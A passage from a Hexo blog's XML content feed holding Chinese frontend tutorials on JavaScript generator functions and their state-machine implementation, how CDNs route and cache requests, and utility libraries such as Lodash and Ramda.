埋点</h2><p>最后一个是前端 sdk 埋点，直接开发一个 js 文件，统计用户的 UV&#x2F;PV 分析等等，比如用户的转化率之类的。</p><p><a name="fAdTU"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://jasonjl.me/blog/2015/06/21/taking-action-on-browser-crashes/">Logging Information on Browser Crashes</a><br /><a href="https://github.com/happylindz/blog/issues/5">前端代码异常监控实战</a><br /><a href="https://blog.csdn.net/a986597353/article/details/78469979">Error Boundaries</a><br /><a href="https://github.com/RicardoCao-Biker/Front-End-Monitoring/blob/master/BasicKnowledge.md">前端监控知识点</a><br /><a href="https://blog.sentry.io/2016/01/04/client-javascript-reporting-window-onerror">Capture and report JavaScript errors with window.onerror</a></p><blockquote><p>文章中“异常监控”中的内容来自于  <a href="http://jartto.wang/">Jartto’s blog </a></p></blockquote><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>generator函数生成器及其实现</title>
      <link href="/2023/04/24/frontend/interview/generator-han-shu-sheng-cheng-qi-ji-qi-shi-xian/"/>
      <url>/2023/04/24/frontend/interview/generator-han-shu-sheng-cheng-qi-ji-qi-shi-xian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>调用生成器函数会返回一个生成器对象，每次调用生成器对象的 next 方法会执行函数到下一次 yield 关键字停止执行，并且返回一个 { value: Value, done: boolean }的对象。本质是协程在 ES6 的实现。<br><a name="lD80g"></a></p><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> g = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 1, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: 3, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><ul><li>首先调用<code>gen()</code> 生成器函数返回 g 生成器对象。</li><li>其次返回的 g 生成器对象中拥有一个 next 的方法。</li><li><strong>每当我们调用</strong><code>**g.next()**</code><strong>方法时，生成器函数紧跟着上一次进行执行，直到函数碰到 yield 关键值。</strong></li><li>yield 关键字会停止函数执行并将 yield 后的值返回作为本次调用 next 函数的 value 进行返回。</li><li>同时，如果本次调用<code>g.next()</code>导致生成器函数执行完毕，那么此时 done 会变成 true 表示该函数执行完毕，反之则为 false 。<br><a name="De3nx"></a></li></ul><h1 id="进阶语法"><a href="#进阶语法" class="headerlink" title="进阶语法"></a>进阶语法</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> a = <span class="keyword">yield</span> <span class="number">1</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a, <span class="string">&#x27;this is a&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> b = <span class="keyword">yield</span> <span class="number">2</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b, <span class="string">&#x27;this is b&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> c = <span class="keyword">yield</span> <span class="number">3</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c, <span class="string">&#x27;this is c&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;res&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> g = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// 打印 &#123; value: 1, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-a&#x27;</span>)); <span class="comment">// 打印 param-a this is a &#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-b&#x27;</span>)); <span class="comment">// 打印 param-b this is b &#123; value: 3, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-c&#x27;</span>)); <span class="comment">// 打印 param-c this is c &#123; value: &#x27;res&#x27;, done: true &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>()); <span class="comment">// 打印 &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><ul><li>定义一个生成器函数，并创建一个生成器对象。</li><li>第一次调用 <code>g.next()</code>方法时，函数执行到 <code>yield 1</code>并中断函数执行，由于代码中断，<code>a</code>的赋值语句并没有被执行。</li><li>第二次调用<code>g.next()</code>方法时，next 接受传参传入一个字符串<code>param-a</code>，函数执行时从上一次中断的地方开始继续执行，也就是执行 <code>a</code>的赋值语句，从打印结果来看，<code>a</code>被赋值为字符<code>param-a</code>。</li><li>第三次调用<code>g.next()</code>方法并传入字符串<code>param-b</code>时，结果同样是变量<code>b</code>被赋值为<code>param-b</code>。</li><li>第四次调用<code>g.next()</code>方法与第二第三次的区别是，<code>return</code>语句作为返回值语句取代了<code>yield</code>语句，所以执行结果是<code>&#123; value: &#39;res&#39;, done: true &#125;</code>。</li><li>第五次调用<code>g.next()</code>，由于生成器函数已经执行完毕，所以打印<code>&#123; value: undefined, done: true &#125;</code>。</li></ul><p>从上述的分析中可以得出两个结论：</p><ol><li>当我们为 next 传递值进行调用时，传入的值会被当作上一次生成器函数暂停时 yield 关键字的返回值处理。</li><li>当生成器函数执行完毕时，原本本次调用 next 方法返回的<code>&#123;done:true,value:undefined&#125;</code>由于<code>return</code>语句变为了<code>&#123; done:true,value:&#39;res&#39;&#125;</code>。<br><a name="lmZhu"></a></li></ol><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">generatorWrap</span> = (<span class="params">fn</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> ctx = &#123;</span><br><span class="line">    <span class="attr">next</span>: <span class="number">0</span>, <span class="comment">// 表示下一次执行生成器函数状态机switch中的下标</span></span><br><span class="line">    <span class="attr">sent</span>: <span class="string">&quot;&quot;</span>, <span class="comment">// 表示next调用时候传入的值 作为上一次yield返回值</span></span><br><span class="line">    <span class="attr">done</span>: <span class="literal">false</span>, <span class="comment">// 是否完成</span></span><br><span class="line">    <span class="comment">// 完成函数</span></span><br><span class="line">    <span class="title function_">stop</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">done</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>(<span class="params">param</span>) &#123;</span><br><span class="line">      <span class="comment">// 1. 修改上一次yield返回值为context.sent</span></span><br><span class="line">      ctx.<span class="property">sent</span> = param;</span><br><span class="line">      <span class="comment">// 2.执行函数 获得本次返回值</span></span><br><span class="line">      <span class="keyword">const</span> value = <span class="title function_">fn</span>(ctx);</span><br><span class="line">      <span class="comment">// 3. 返回</span></span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">done</span>: ctx.<span class="property">done</span>,</span><br><span class="line">        value,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gen</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> a, b, c;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">generatorWrap</span>(<span class="keyword">function</span> (<span class="params">ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> ((ctx.<span class="property">prev</span> = ctx.<span class="property">next</span>)) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ctx.<span class="property">next</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        a = ctx.<span class="property">sent</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(a, <span class="string">&#x27;this is a&#x27;</span>);</span><br><span class="line">        ctx.<span class="property">next</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        b = ctx.<span class="property">sent</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b, <span class="string">&#x27;this is b&#x27;</span>);</span><br><span class="line">        ctx.<span class="property">next</span> = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        c = ctx.<span class="property">sent</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(c, <span class="string">&#x27;this is c&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;end&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="title function_">stop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> g = <span class="title function_">gen</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-a&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-b&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(g.<span class="title function_">next</span>(<span class="string">&#x27;param-c&#x27;</span>));</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 原理 </tag>
            
            <tag> js </tag>
            
            <tag> es6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN</title>
      <link href="/2022/12/12/frontend/browser/cdn/"/>
      <url>/2022/12/12/frontend/browser/cdn/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="ttqHt"></a></p><h2 id="CDN-是什么"><a href="#CDN-是什么" class="headerlink" title="CDN 是什么"></a>CDN 是什么</h2><p>内容分发网络（Content delivery network 或 Content distribution network，缩写：CDN）是指一种通过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p><p><a name="FaHam"></a></p><h2 id="为什么需要-CDN"><a href="#为什么需要-CDN" class="headerlink" title="为什么需要 CDN"></a>为什么需要 CDN</h2><p>根本上的原因是，访问速度对互联网应用的用户体验、口碑、甚至说直接的营收都有巨大的影响，任何的企业都渴望自己站点有更快的访问速度。而 HTTP 传输时延对 web 的访问速度的影响很大，在绝大多数情况下是起决定性作用的，这是由 TCP&#x2F;IP 协议的一些特点决定的。物理层上的原因是光速有限、信道有限，协议上的原因有丢包、慢启动、拥塞控制等。<br />要提高访问速度，最简单的做法当然就是多设置几个服务器，让终端用户离服务器“更近”。典型的例子是各类下载网站在不同地域不同运营商设置镜像站，或者是像 Google 那样设置多个数据中心。但是多设几个服务器的问题也不少，一是多地部署时的困难，二是一致性没法保障，三则是管理困难、成本很高。实际上，在排除多地容灾等特殊需求的情况下，对大多数公司这种做法是不太可取的。当然，这种方案真正做好了，甚至是比后续所说的使用 CDN 要好的。<br />CDN 是一种公共服务，他本身有很多台位于不同地域、接入不同运营商的服务器，而所谓的使用 CDN 实质上就是让 CDN 作为网站的门面，用户访问到的是 CDN 服务器，而不是直接访问到网站。由于 CDN 内部对 TCP 的优化、对静态资源的缓存、预取，加上用户访问 CDN 时，会被智能地分配到最近的节点，降低大量延迟，让访问速度可以得到很大提升。<br />这样做有什么好处呢？</p><ol><li>本地 Cache 加速，加快访问速度</li><li>镜像服务，消除运营商之间互联的瓶颈影响，保证不同网络的用户都能得到良好的访问质量</li><li>远程加速，自动选择 cache 服务器</li><li>带宽优化，分担网络流量，减轻压力，</li><li>集群抗攻击</li><li>节约成本</li></ol><p><a name="aaH0P"></a></p><h2 id="CDN-的原理"><a href="#CDN-的原理" class="headerlink" title="CDN 的原理"></a>CDN 的原理</h2><blockquote><p>CDN 做了两件事，一是让用户访问最近的节点，二是从缓存或者源站获取资源</p></blockquote><p>CDN 有个源站的概念，源站就是提供内容的站点(网站的真实服务器), 从源站取内容的过程叫做<strong>回源</strong>。<br />每次访问的具体流程如图（以最普通的 CDN 为例）<br /><a href="https://cloud.githubusercontent.com/assets/5894477/22008791/4edc00b0-dcb9-11e6-9663-ed19a3fa3182.png"><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589513075507-93ef051e-6bae-40f5-9efc-1c714ba3feb8.png#height=490&id=w8AZT&originHeight=490&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=539" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589513075507-93ef051e-6bae-40f5-9efc-1c714ba3feb8.png#height=490&id=w8AZT&originHeight=490&originWidth=539&originalType=binary&ratio=1&rotation=0&showTitle=false&size=0&status=done&style=none&title=&width=539" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></a></p><p>具体举个例子：<br />用户在首次访问 <a href="https://assets-cdn.github.com/pinned-octocat.svg">https://assets-cdn.github.com/pinned-octocat.svg</a> , 假设不委托 local DNS 服务器递归查询，会经历以下几个过程</p><ol><li>浏览器检查本地有没有这个东东的有效缓存，有则使用缓存，没有有效缓存则进行对<code>assets-cdn.github.com</code>的 DNS 查询，获得一个 CNAME 记录, <code>igithub.map.fastly.net</code>,值得注意的是，多个加速域名可以解析到同一个 CNAME，CDN 回源和缓存的时候考虑到了 hostname，👍；</li><li>进行对<code>github.map.fastly.net</code>的 DNS 查询，获得一个 A&#x2F;AAAA 记录，给出地址<code>103.245.222.133</code>（视网站不同返回的不一样，可以有多个）, 这一步对 CDN 来说时十分重要的，它给出了离用户最近的边缘节点；</li><li>浏览器选一个返回的地址，然后进行真正的 http 请求，开始向<code>103.245.222.133</code>握手，握手完了把 http 请求头也发给了该边缘服务器;</li><li>边缘服务器检查自己的 cache 里面有没有<code>[https://assets-cdn.github.com/pinned-octocat.svg](https://assets-cdn.github.com/pinned-octocat.svg)</code>这个资源，有则返回给用户，如果没有，向 CDN 中心服务器发起请求;</li><li>CDN 中心服务器检查自己的 cache 里面有没有这个资源，有则返回给边缘服务器，没有则回源;</li><li>中心服务器发现客户配置了<code>github.map.fastly.net</code>的回源地址(这个只有 cdn 会知道，假设是<code>xxx.xxx.xxx.xxx</code>)，就把 http 请求发到源站地址上，源站返回后返回给请求方;</li></ol><p>可以看出 CDN 加速的原理很大部分是跟 DNS 挂钩在一起的，CDN 供应商几乎一定需要一个智能 DNS 服务器。CDN 可以拿到所有的明文数据，所以对数据安全性、保密性要求比较高的企业会选择自建 CDN 或者设置 NS 记录，指向自建的智能 DNS 服务器。<br />上述步骤每一步都可以缓存，注意是每一步！ 所以 CDN 要清除缓存很难，因为有很多服务器上的缓存要清除。无论是用户对边缘服务器的请求，还是 CDN 服务器的回源都可以使用 https。<br />注意，实际环境中图中每个服务器都可以是集群，甚至 CDN 分区域中心和总中心。</p><p><a name="1Isay"></a></p><h3 id="文件更新的原理"><a href="#文件更新的原理" class="headerlink" title="文件更新的原理"></a>文件更新的原理</h3><p>用户访问使用了 CDN 技术的文件后，在多个环节都可能会产生缓存，比如用户的浏览器中、CDN 的边缘节点等。浏览器端的缓存一般通过过期时间来自动更新；而对于 CDN 节点上缓存的更新，一般是通过源站更新后，手动触发 CDN 的缓存删除操作。</p><p><a name="oLpLA"></a></p><h2 id="使用-CDN-用-CDN-托管静态资源"><a href="#使用-CDN-用-CDN-托管静态资源" class="headerlink" title="使用 CDN (用 CDN 托管静态资源)"></a>使用 CDN (用 CDN 托管静态资源)</h2><p>（使用 CDN，抛开无用的 cookie）<br />要知道，浏览器第一次打开页面的时候，浏览器缓存是起不了作任何用的；使用 CDN，效果就很明显。<br /><strong>CDN 缓存，也叫网关缓存、反向代理缓存</strong>。浏览器先向 CDN 网关发起 WEB 请求，网关服务器后面对应着一台或多台负载均衡源服务器，会根据它们的负载请求，动态地请求转发到合适的源服务器上。<br />通过在现有的 Internet 中增加一层新的 CACHE(缓存)层，将网站的内容发布到最接近用户的网络”边缘“的节点，使用户可以就近取得所需的内容，提高用户访问网站的响应速度。<br />cdn 从技术上全面解决由于网络带宽小、用户访问量大、网点分布不均等原因，提高用户访问网站的响应速度。<strong>CDN 网络是在用户和服务器之间增加 Cache 层，主要是通过接管 DNS 实现,将用户的请求引导到 Cache 上获得源服务器的数据</strong>。<br />使用了 CDN 缓存后的网站的访问过程变为：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589513234285-3996bc7e-36f9-4082-ba78-86916438d850.png#height=384&id=pht4z&originHeight=384&originWidth=680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143841&status=done&style=none&title=&width=680" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/164572/1589513234285-3996bc7e-36f9-4082-ba78-86916438d850.png#height=384&id=pht4z&originHeight=384&originWidth=680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=143841&status=done&style=none&title=&width=680" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><ol><li>用户输入访问的域名,操作系统向 LocalDns 查询域名的 ip 地址;</li><li>LocalDns 向 ROOT DNS 查询域名的授权服务器(这里假设 LocalDns 缓存过期);</li><li>ROOT DNS 将域名授权 dns 记录回应给 LocalDns，LocalDns 得到域名的授权 dns 记录后,继续向域名授权 dns 查询域名的 ip 地址;</li><li>域名授权 dns 查询域名记录后(一般是 CNAME)，回应给 LocalDns，LocalDns 得到域名记录后,向智能调度 DNS 查询域名的 ip 地址;</li><li>智能调度 DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的 CDN 节点 ip 地址回应给 LocalDns，LocalDns 将得到的域名 ip 地址，回应给用户端，用户得到域名 ip 地址后，访问站点服务器;</li><li>CDN 节点服务器应答请求，将内容返回给客户端.(缓存服务器一方面在本地进行保存，以备以后使用，二方面把获取的数据返回给客户端，完成数据服务过程)</li></ol><blockquote><p>作者：<a href="https://github.com/renaesop">renaesop</a><br>链接：<a href="https://github.com/renaesop/blog/issues/1">https://github.com/renaesop/blog/issues/1</a><br>时间：2016-05-06<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据处理库</title>
      <link href="/2022/12/04/frontend/collection/wheel/shu-ju-chu-li/"/>
      <url>/2022/12/04/frontend/collection/wheel/shu-ju-chu-li/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663397468320-4d3708fb-1bdc-4a21-8185-2bdfba047021.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663397468320-4d3708fb-1bdc-4a21-8185-2bdfba047021.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="Q7mK7"></a></p><h1 id="1-工具库"><a href="#1-工具库" class="headerlink" title="1. 工具库"></a>1. 工具库</h1><p><a name="mqTfI"></a></p><h2 id="（1）Lodash"><a href="#（1）Lodash" class="headerlink" title="（1）Lodash"></a>（1）Lodash</h2><p>Lodash 是一个一致性、模块化、高性能、提高开发者效率的 JavaScript 实用工具库。Lodash 通过降低 array、number、objects、string 等等的使用难度从而让 JavaScript 变得更简单。 Lodash 的模块化方法，非常适用于：<br />● 遍历 array、object 和 string；<br />● 对值进行操作和检测；<br />● 创建符合功能的函数。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663344960809-61ca2ecc-899f-4bf6-8d82-1b9c39b64427.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663344960809-61ca2ecc-899f-4bf6-8d82-1b9c39b64427.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="UXOpY"></a></p><h2 id="（2）Underscore-js"><a href="#（2）Underscore-js" class="headerlink" title="（2）Underscore.js"></a>（2）Underscore.js</h2><p>Underscore.js 是一个实用的 JavaScript 工具库，它提供了一整套函数式编程的实用功能，但没有扩展任何 JavaScript 内置对象，而是将数据封装在一个自定义对象中。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345962141-8ba80bde-78a0-4036-8127-75af27fd6d03.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345962141-8ba80bde-78a0-4036-8127-75af27fd6d03.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="GcNN6"></a></p><h2 id="（3）Ramda"><a href="#（3）Ramda" class="headerlink" title="（3）Ramda"></a>（3）Ramda</h2><p>Ramda 的目标是专门为函数式编程风格而设计，更容易创建函数式 pipeline、且从不改变用户已有数据。Ramda 主要特性如下：<br />●Ramda 强调更加纯粹的函数式风格。数据不变性和函数无副作用是其核心设计理念。这可以帮助你使用简洁、优雅的代码来完成工作。<br />●Ramda 函数本身都是自动柯里化的。这可以让你在只提供部分参数的情况下，轻松地在已有函数的基础上创建新函数。<br />●Ramda 函数参数的排列顺序更便于柯里化。要操作的数据通常在最后面。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345263357-d4adf726-0169-4b35-9dee-5e7042068097.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345263357-d4adf726-0169-4b35-9dee-5e7042068097.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="qZBrQ"></a></p><h2 id="（4）Collect-js"><a href="#（4）Collect-js" class="headerlink" title="（4）Collect.js"></a>（4）Collect.js</h2><p>collect.js 是 JavaScript 处理数组和对象的方便且无依赖的包装类工具。其提供了常用的数组和集合的操作 API，map，reduce，filter 等集合的高级方法，设计灵感来源于 Laravel Collection。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663346140487-27c42d73-9e35-48cd-b719-d4a34fa469fd.png" class="lazyload placeholder" 